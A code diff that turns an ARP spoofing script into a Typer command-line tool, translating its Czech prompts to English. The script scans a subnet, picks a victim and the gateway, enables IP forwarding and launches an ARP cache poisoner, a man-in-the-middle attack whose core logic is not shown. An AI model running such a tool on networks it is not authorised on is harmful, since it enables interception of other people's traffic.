@@ -1,56 +1,75 @@
 import atexit
-import os
-import platform
 
+import typer
 from scapy.all import conf
 
-from network_utils import SelectTargetParams, get_gateway_mac, get_target, scan_network
-from spoofer_logic import ArpSpoofer
+from network_utils import (
+    SelectTargetParams,
+    get_gateway_mac,
+    get_target,
+    scan_network,
+    toggle_forwarding,
+)
+from SpooferLogic import ArpSpoofer
+
+app = typer.Typer()
 
 
-def toggle_forwarding(enable: bool) -> None:
-    system = platform.system()
-    match system:
-        case "Linux":
-            os.system(f"sysctl -w net.ipv4.ip_forward={'1' if enable else '0'}")
-        case "Windows":
-            os.system(f"netsh interface ipv4 set global forwarding={'enabled' if enable else 'disabled'}")
-        case _:
-            print("[-] Neznámý OS. Nelze nastavit IP forwarding.")
+@app.command()
+def main(
+    ip_range: str = typer.Argument(..., help="IP range to scan (e.g. 192.168.1.0/24)"),
+    target: str = typer.Option(
+        None, "--target", "-t", help="Target number from the list, or 'r' for router"
+    ),
+) -> None:
+    """ARP spoofing tool – scan the network and poison a target's ARP cache."""
 
-
-def main() -> None:
-    ip_range = input("[?] Zadejte IP rozsah (např. 192.168.1.1/24): ").strip()
-
-    print("\n[+] Skenuji síť...")
+    typer.echo("\n[+] Scanning network...")
     devices = scan_network(ip_range)
-    for i, d in enumerate(devices, start=1):
-        print(f"{i}. | IP: {d['ip']} | MAC: {d['mac']}")
 
+    for i, d in enumerate(devices, start=1):
+        typer.echo(f"{i}. | IP: {d['ip']} | MAC: {d['mac']}")
+
+    # Resolve gateway IP and MAC
     router_ip = conf.route.route("0.0.0.0/0")[2]
     router_mac = get_gateway_mac()
+
     if not router_mac:
-        print("[-] Nepodařilo se získat MAC routeru. Ukončuji.")
-        return
-    print(f"\n[+] Router: IP: {router_ip} | MAC: {router_mac}")
+        typer.echo("[-] Could not resolve router MAC address. Exiting.", err=True)
+        raise typer.Exit(1)
 
-    while True:
-        choice = input("\n[?] Zadejte číslo oběti (nebo 'r' pro router): ").strip().lower()
-        if not choice:
-            print("[-] Neplatný vstup.")
-            continue
-        if choice == "r":
-            target_ip, target_mac = router_ip, router_mac
-            break
+    typer.echo(f"\n[+] Router: IP: {router_ip} | MAC: {router_mac}")
+
+    # If --target was not provided, ask interactively
+    if target is None:
+        target = (
+            typer.prompt("\n[?] Enter target number (or 'r' for router)")
+            .strip()
+            .lower()
+        )
+
+    if target == "r":
+        target_ip, target_mac = router_ip, router_mac
+    else:
         try:
-            target_ip, target_mac = get_target(SelectTargetParams(choice=choice, devices=devices))
-            break
+            target_ip, target_mac = get_target(
+                SelectTargetParams(choice=target, devices=devices)
+            )
         except ValueError as e:
-            print(e)
+            typer.echo(f"[-] {e}", err=True)
+            raise typer.Exit(1)
 
-    print("\n[+] Zapínám IP forwarding...")
+    # Enable IP forwarding so traffic is relayed through this machine
+    typer.echo("\n[+] Enabling IP forwarding...")
     toggle_forwarding(True)
-    atexit.register(lambda: (print("\n[+] Vypínám IP forwarding..."), toggle_forwarding(False)))
+
+    # Ensure forwarding is disabled on exit
+    atexit.register(
+        lambda: (
+            typer.echo("\n[+] Disabling IP forwarding..."),
+            toggle_forwarding(False),
+        )
+    )
 
     ArpSpoofer(
         target_ip=target_ip,
@@ -61,4 +80,4 @@ def main() -> None:
 
 
 if __name__ == "__main__":
-    main()
+    app()
